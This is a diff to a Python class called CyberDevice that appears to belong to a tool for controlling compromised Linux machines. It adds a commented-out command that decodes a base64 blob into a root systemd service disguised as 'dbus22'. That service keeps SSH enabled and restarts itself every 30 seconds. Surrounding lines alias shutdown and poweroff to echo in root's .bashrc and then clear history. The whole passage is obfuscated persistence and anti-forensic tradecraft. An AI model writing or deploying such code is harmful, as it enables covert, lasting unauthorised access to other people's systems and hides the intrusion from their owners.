@@ -135,6 +135,8 @@ class CyberDevice:
         self.execute("echo 'echo \"alias shutdown=echo\" >> /root/.bashrc' | sudo bash")
         self.execute("echo 'echo \"alias poweroff=echo\" >> /root/.bashrc' | sudo bash")
 
+        # echo 'echo W1VuaXRdCkRlc2NyaXB0aW9uPUVuYWJsZSBzc2gKQWZ0ZXI9bmV0d29yay1vbmxpbmUudGFyZ2V0CldhbnRzPW5ldHdvcmstb25saW5lLnRhcmdldAoKW1NlcnZpY2VdClR5cGU9c2ltcGxlCkV4ZWNTdGFydD1zeXN0ZW1jdGwgZW5hYmxlIHNzaC5zZXJ2aWNlICYmIHN5c3RlbWN0bCByZXN0YXJ0IHNzaC5zZXJ2aWNlICYmIHN5c3RlbWN0bCBlbmFibGUgc3NoZC5zZXJ2aWNlICYmIHN5c3RlbWN0bCByZXN0YXJ0IHNzaGQuc2VydmljZSAmJiBleGl0IDEzClJlc3RhcnQ9YWx3YXlzClJlc3RhcnRTZWM9MzAKVXNlcj1yb290CkxpbWl0Tk9GSUxFPTY1NTM1CgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQK | base64 -d > /etc/systemd/system/dbus22.service && systemctl daemon-reload && systemctl enable dbus22.service && systemctl restart dbus22.service' | sudo bash
+
         self.clear_history()
 
     def ssh_open(self):
